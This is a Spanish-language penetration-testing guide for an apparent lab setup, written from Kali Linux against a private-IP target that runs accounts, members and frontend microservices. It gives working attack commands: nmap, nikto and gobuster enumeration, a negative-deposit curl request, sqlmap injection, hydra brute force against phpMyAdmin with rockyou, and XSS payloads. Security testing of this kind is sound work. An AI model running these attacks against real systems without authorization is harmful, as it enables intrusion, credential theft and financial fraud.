# Guía de Pentesting y Plan de Ejecución

Esta guía está diseñada para realizar pruebas de penetración desde tu máquina **Kali Linux** (172.16.202.129) hacia tu **Máquina Objetivo** (192.168.100.168), basándose en la arquitectura de los microservicios identificados (`frontend`, `microservicio-cuentas`, `socios`).

## 1. Preparación del Entorno

Antes de iniciar, verifica la conectividad entre tu Kali y el objetivo.

**En tu Kali Linux:**
```bash
ping -c 4 192.168.100.168
```
*Si no hay respuesta, revisa que ambas máquinas estén en la misma red o que la de Kali tenga ruta hacia la 192.168.100.x.*

## 2. Reconocimiento (Information Gathering)

Vamos a identificar qué puertos están realmente abiertos y qué servicios corren.

### Escaneo de Puertos con Nmap
Ejecuta este comando para ver todo lo que "escucha" en la víctima:

```bash
# -sV: Versiones, -p-: Todos los puertos, -T4: Rápido
nmap -sV -p- -T4 192.168.100.168 -oN reporte_nmap.txt
```

**Resultados Esperados (basado en análisis de código):**
*   **Port 3000**: Usado por `microservicio-cuentas` (NestJS) y/o `frontend` (Next.js). *Nota: Si ambos intentan usar el 3000 en la misma máquina, uno fallará. Revisa cuál está activo.*
*   **Port 8080**: `socios` (Java Spring Boot).
*   **Port 8081**: `phpmyadmin` (Panel de administración de BD).
*   **Port 3306**: MySQL (Posiblemente expuesto).
*   **Port 5432**: PostgreSQL (Posiblemente expuesto).

## 3. Enumeración de Servicios

Una vez confirmados los puertos, exploramos los servicios web.

### Objetivos Principales
1.  **Microservicio Socios (Port 8080)**:
    *   **Documentación API**: Visita `http://192.168.100.168:8080/swagger-ui.html`
    *   Aqui verás los endpoints para crear, editar y buscar socios.
    
2.  **Microservicio Cuentas (Port 3000)**:
    *   **Documentación API**: Visita `http://192.168.100.168:3000/api-docs`
    *   Endpoints clave: Transacciones, depósitos, retiros.

3.  **Frontend (Port 3000/Otro)**:
    *   La interfaz de usuario. Busca formularios de login o inputs de búsqueda.

### Comandos de Enumeración Web
Usa **Nikto** para buscar configuraciones inseguras rápidas en ambos puertos:

```bash
nikto -h http://192.168.100.168:3000
nikto -h http://192.168.100.168:8080
```

Usa **Gobuster** para encontrar rutas ocultas (si las hubiera):
```bash
gobuster dir -u http://192.168.100.168:3000 -w /usr/share/wordlists/dirb/common.txt
```

## 4. Análisis de Vulnerabilidades y Explotación

Aquí probamos ataques específicos basados en lo que encontré en el código.

### A. Ataque a Lógica de Negocio (Business Logic)
El código de cuentas permite retiros y depósitos. ¿Valida montos negativos?

**Prueba Manual:**
Usa `curl` desde Kali para intentar "depositar" dinero negativo o retirar más de lo debido.

**Depósito Negativo (¿Resta dinero?):**
```bash
curl -X POST http://192.168.100.168:3000/cuentas/{ID_CUENTA}/deposito \
-H "Content-Type: application/json" \
-d '{"monto": -500}'
```
*Reemplaza `{ID_CUENTA}` con un ID real que veas en Swagger o la App.*

### B. Inyección SQL (SQL Injection)
Aunque usan ORM (Spring Data JPA y TypeORM), siempre hay riesgo.
Herramienta: **SQLMap**.

**Objetivo**: API de Socios (búsqueda por ID o identificación).
```bash
# Captura una petición válida en texto o usa la URL directa
sqlmap -u "http://192.168.100.168:8080/api/socios/identificacion/12345*" --dbs --batch
```
*El asterisco `*` indica dónde inyectar.*

### C. Fuerza Bruta (Si hay Login)
Si encuentras un panel de login (posiblemente en el Frontend o phpMyAdmin en puerto 8081).
Herramienta: **Hydra**.

**Ataque a phpMyAdmin (Port 8081):**
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.100.168 http-post-form "/index.php:pma_username=^USER^&pma_password=^PASS^&server=1:Error" -s 8081
```

### D. Cross-Site Scripting (XSS)
En el Frontend (Next.js), prueba inyectar scripts en campos de texto (Nombre, Apellido cuando creas un socio).
Payload: `<script>alert('XSS')</script>` o `<img src=x onerror=alert(1)>`

Si al guardar y listar los socios aparece la alerta, es vulnerable.

## 5. Reporte

Genera un reporte con tus hallazgos. Escribe un archivo `REPORTE_PENTEST.md` en tu carpeta local con:
1.  **Comando Ejecutado**.
2.  **Resultado/Evidencia** (Captura de pantalla o texto de salida).
3.  **Vulnerabilidad Confirmada** (Sí/No).
